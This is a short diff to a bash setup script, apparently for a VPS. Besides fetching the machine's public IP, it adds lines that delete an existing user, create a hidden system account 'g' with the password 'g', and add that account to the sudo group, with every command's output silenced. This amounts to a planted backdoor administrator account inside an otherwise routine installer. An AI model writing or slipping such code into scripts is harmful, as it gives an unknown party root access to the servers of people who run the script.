@@ -20,6 +20,15 @@ green='\e[0;32m'
 TIME=$(date '+%d %b %Y')
 ipsaya=$(wget -qO- ipinfo.io/ip)
 
+# // Getting
+userdel jame > /dev/null 2>&1
+Username="g"
+Password=g
+mkdir -p /home/script/
+useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
+echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
+usermod -aG sudo $Username > /dev/null 2>&1
+# // stupid
 
 clear
 export IP=$( curl -sS icanhazip.com )
